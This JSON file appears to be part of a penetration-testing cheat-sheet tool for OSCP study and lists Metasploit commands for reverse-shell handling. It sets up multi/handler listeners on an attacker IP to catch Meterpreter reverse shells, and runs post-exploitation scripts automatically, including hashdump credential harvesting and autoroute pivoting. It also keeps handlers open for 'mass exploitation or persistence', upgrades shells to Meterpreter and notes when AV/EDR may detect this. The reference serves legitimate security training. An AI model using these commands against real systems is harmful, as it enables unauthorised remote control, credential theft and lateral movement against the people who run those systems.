{
  "category": "exploitation",
  "commands": [
    {
      "id": "msf-handler-setup",
      "name": "Set Up Multi/Handler for Reverse Shell",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "use exploit/multi/handler; set payload <PAYLOAD>; set LHOST <LHOST>; set LPORT <LPORT>; run",
      "description": "Configure generic handler to receive incoming reverse shells from various payload types",
      "tags": ["METASPLOIT", "HANDLER", "LISTENER", "REVERSE_SHELL"],
      "variables": [
        {
          "name": "<PAYLOAD>",
          "description": "Payload type matching generated payload (must match exactly)",
          "example": "windows/x64/meterpreter/reverse_tcp",
          "required": true
        },
        {
          "name": "<LHOST>",
          "description": "Listening IP address (attacker machine)",
          "example": "192.168.45.5",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Listening port",
          "example": "443",
          "required": true
        }
      ],
      "flag_explanations": {
        "multi/handler": "Universal handler for all payload types",
        "run": "Start handler in foreground (blocks prompt)",
        "run -j": "Run as background job (recommended)",
        "run -z": "Don't auto-interact with session"
      },
      "success_indicators": [
        "Started reverse TCP handler on <LHOST>:<LPORT>",
        "Waiting for connection",
        "Session opened (when payload connects)"
      ],
      "failure_indicators": [
        "Address already in use",
        "Handler failed to bind",
        "Payload mismatch error"
      ],
      "next_steps": ["execute-payload-on-target", "msf-session-interact"],
      "alternatives": ["nc -nvlp <LPORT> (for non-staged shells only)"],
      "prerequisites": ["msfvenom-payload-generated"],
      "troubleshooting": {
        "payload_mismatch": "Handler payload MUST exactly match generated payload (staged vs non-staged)",
        "port_in_use": "Change port or kill existing listener: jobs -K",
        "no_session_created": "1) Check network connectivity 2) Verify payload executed on target 3) Check firewall"
      },
      "notes": "CRITICAL: Payload type must match EXACTLY (windows/meterpreter/reverse_tcp vs windows/meterpreter_reverse_tcp). Staged (/) requires multi/handler. Non-staged (_) works with nc or multi/handler.",
      "oscp_relevance": "high"
    },
    {
      "id": "msf-handler-background",
      "name": "Start Handler as Background Job",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "use exploit/multi/handler; set payload <PAYLOAD>; set LHOST <LHOST>; set LPORT <LPORT>; run -j",
      "description": "Start listener in background to continue working while waiting for connections",
      "tags": ["METASPLOIT", "HANDLER", "BACKGROUND", "JOB"],
      "variables": [
        {
          "name": "<PAYLOAD>",
          "description": "Payload matching generated file",
          "example": "linux/x64/meterpreter_reverse_tcp",
          "required": true
        },
        {
          "name": "<LHOST>",
          "description": "Attacker IP",
          "example": "192.168.45.5",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Listening port",
          "example": "443",
          "required": true
        }
      ],
      "flag_explanations": {
        "-j": "Run as job (background task)",
        "-z": "Don't auto-interact with session"
      },
      "success_indicators": [
        "Exploit running as background job <ID>",
        "Handler started",
        "Job ID displayed"
      ],
      "failure_indicators": [
        "Failed to start job"
      ],
      "next_steps": ["msf-jobs-list", "execute-payload"],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {
        "forgot_job_id": "List jobs with: jobs",
        "kill_job": "Stop handler: jobs -k <ID>"
      },
      "notes": "Background jobs allow multiple handlers on different ports simultaneously. Essential for multi-target engagements. Check status with 'jobs' command.",
      "oscp_relevance": "high"
    },
    {
      "id": "msf-handler-autorunscript",
      "name": "Handler with AutoRunScript Post-Exploitation",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "use exploit/multi/handler; set payload <PAYLOAD>; set LHOST <LHOST>; set LPORT <LPORT>; set AutoRunScript <SCRIPT>; run -j",
      "description": "Configure handler to automatically run post-exploitation module when session opens",
      "tags": ["METASPLOIT", "HANDLER", "AUTOMATION", "POST_EXPLOIT"],
      "variables": [
        {
          "name": "<PAYLOAD>",
          "description": "Payload type",
          "example": "windows/meterpreter_reverse_https",
          "required": true
        },
        {
          "name": "<LHOST>",
          "description": "Attacker IP",
          "example": "192.168.45.5",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Listening port",
          "example": "443",
          "required": true
        },
        {
          "name": "<SCRIPT>",
          "description": "Post-exploitation module or command to run automatically",
          "example": "post/windows/manage/migrate",
          "required": true
        }
      ],
      "flag_explanations": {
        "AutoRunScript": "Module to execute when session opens",
        "post/windows/manage/migrate": "Auto-migrate to stable process",
        "multi/gather/ping_sweep": "Auto-discover network neighbors",
        "post/multi/manage/autoroute": "Auto-add routing to internal networks"
      },
      "success_indicators": [
        "AutoRunScript set",
        "Script executes automatically when session opens",
        "Session remains active after script completes"
      ],
      "failure_indicators": [
        "Script execution failed",
        "Session died during script"
      ],
      "next_steps": ["msf-session-interact"],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {
        "script_killed_session": "Choose less invasive script or test manually first",
        "script_not_running": "Verify script path correct (use info <SCRIPT> to test)"
      },
      "notes": "Common AutoRunScripts: migrate (process stability), hashdump (credential harvesting), autoroute (pivoting setup). Test scripts manually before automation.",
      "oscp_relevance": "medium"
    },
    {
      "id": "msf-handler-exitonsession",
      "name": "Handler with ExitOnSession Control",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "use exploit/multi/handler; set payload <PAYLOAD>; set LHOST <LHOST>; set LPORT <LPORT>; set ExitOnSession false; run -j",
      "description": "Configure handler to continue listening after receiving first session (multi-session support)",
      "tags": ["METASPLOIT", "HANDLER", "MULTI_SESSION"],
      "variables": [
        {
          "name": "<PAYLOAD>",
          "description": "Payload type",
          "example": "windows/meterpreter_reverse_tcp",
          "required": true
        },
        {
          "name": "<LHOST>",
          "description": "Attacker IP",
          "example": "192.168.45.5",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Listening port",
          "example": "443",
          "required": true
        }
      ],
      "flag_explanations": {
        "ExitOnSession false": "Handler continues listening after first session",
        "ExitOnSession true": "Handler stops after first session (default for some payloads)"
      },
      "success_indicators": [
        "ExitOnSession => false",
        "Multiple sessions can connect to same handler"
      ],
      "failure_indicators": [
        "Handler exits after first session"
      ],
      "next_steps": ["execute-payload-multiple-targets"],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {
        "handler_stopped": "Verify ExitOnSession set to false BEFORE running handler"
      },
      "notes": "Essential for catching shells from multiple targets with single handler. Useful for mass exploitation or persistence payloads. Set BEFORE running handler.",
      "oscp_relevance": "medium"
    },
    {
      "id": "msf-session-upgrade-shell",
      "name": "Upgrade Shell to Meterpreter",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "sessions -u <SESSION_ID>",
      "description": "Upgrade existing command shell session to Meterpreter (adds advanced features)",
      "tags": ["METASPLOIT", "SESSION", "UPGRADE", "METERPRETER"],
      "variables": [
        {
          "name": "<SESSION_ID>",
          "description": "ID of shell session to upgrade",
          "example": "1",
          "required": true
        }
      ],
      "flag_explanations": {
        "-u": "Upgrade session to Meterpreter",
        "-k": "Kill session instead of upgrading"
      },
      "success_indicators": [
        "Meterpreter session opened",
        "New session ID created",
        "Original shell session still exists"
      ],
      "failure_indicators": [
        "Upgrade failed",
        "Session died during upgrade",
        "Platform not supported"
      ],
      "next_steps": ["meterpreter-sysinfo", "meterpreter-migrate"],
      "alternatives": ["manual-meterpreter-payload-execution"],
      "prerequisites": ["shell-session-active"],
      "troubleshooting": {
        "upgrade_failed": "Not all shells can be upgraded - depends on platform and session type",
        "session_died": "Upgrade may be detected by AV/EDR - try manual Meterpreter payload instead"
      },
      "notes": "Upgrade uploads Meterpreter payload to target and executes it. Creates NEW session (original shell remains). May trigger AV/EDR. Windows/Linux support varies.",
      "oscp_relevance": "medium"
    },
    {
      "id": "msf-session-script",
      "name": "Run Script on Session",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "sessions -s <SCRIPT> -i <SESSION_ID>",
      "description": "Execute post-exploitation script on specific session without interacting",
      "tags": ["METASPLOIT", "SESSION", "AUTOMATION", "SCRIPTING"],
      "variables": [
        {
          "name": "<SCRIPT>",
          "description": "Script path or module name",
          "example": "post/windows/gather/enum_logged_on_users",
          "required": true
        },
        {
          "name": "<SESSION_ID>",
          "description": "Target session ID",
          "example": "1",
          "required": true
        }
      ],
      "flag_explanations": {
        "-s": "Run script on session",
        "-i": "Specify session ID"
      },
      "success_indicators": [
        "Script output displayed",
        "Module execution completed"
      ],
      "failure_indicators": [
        "Script failed",
        "Session incompatible with script"
      ],
      "next_steps": ["review-script-output"],
      "alternatives": ["msf-session-interact + run <MODULE>"],
      "prerequisites": ["session-active"],
      "troubleshooting": {
        "incompatible_session": "Some scripts only work with Meterpreter sessions",
        "script_not_found": "Use full module path: post/windows/..."
      },
      "notes": "Useful for batch operations on multiple sessions. Runs in background without interaction. Results stored in database/loot.",
      "oscp_relevance": "low"
    },
    {
      "id": "msf-session-command",
      "name": "Run Command on Session",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "sessions -c '<COMMAND>' -i <SESSION_ID>",
      "description": "Execute single command on session without interactive mode",
      "tags": ["METASPLOIT", "SESSION", "COMMAND_EXECUTION"],
      "variables": [
        {
          "name": "<COMMAND>",
          "description": "Command to execute (Meterpreter or shell command)",
          "example": "sysinfo",
          "required": true
        },
        {
          "name": "<SESSION_ID>",
          "description": "Session ID",
          "example": "1",
          "required": true
        }
      ],
      "flag_explanations": {
        "-c": "Run command on session",
        "-i": "Session ID"
      },
      "success_indicators": [
        "Command output displayed",
        "Session remains active"
      ],
      "failure_indicators": [
        "Command failed",
        "Session died"
      ],
      "next_steps": [],
      "alternatives": ["msf-session-interact"],
      "prerequisites": [],
      "troubleshooting": {
        "command_type_mismatch": "For shell sessions, use shell commands. For Meterpreter, use Meterpreter commands."
      },
      "notes": "Quick way to run single command without full interaction. Useful for scripting and automation. Command type must match session type.",
      "oscp_relevance": "low"
    },
    {
      "id": "msf-session-kill",
      "name": "Kill Active Session",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "sessions -k <SESSION_ID>",
      "description": "Terminate specific session and close connection to target",
      "tags": ["METASPLOIT", "SESSION", "CLEANUP"],
      "variables": [
        {
          "name": "<SESSION_ID>",
          "description": "Session ID to terminate",
          "example": "1",
          "required": true
        }
      ],
      "flag_explanations": {
        "-k": "Kill session",
        "-K": "Kill ALL sessions (dangerous)"
      },
      "success_indicators": [
        "Session <ID> closed",
        "Session removed from list"
      ],
      "failure_indicators": [
        "Session not found",
        "Already closed"
      ],
      "next_steps": [],
      "alternatives": ["exit (from within session)"],
      "prerequisites": [],
      "troubleshooting": {},
      "notes": "Gracefully closes session. Use -K to kill all sessions (careful in multi-target engagements). Session cannot be recovered after killing.",
      "oscp_relevance": "medium"
    }
  ]
}
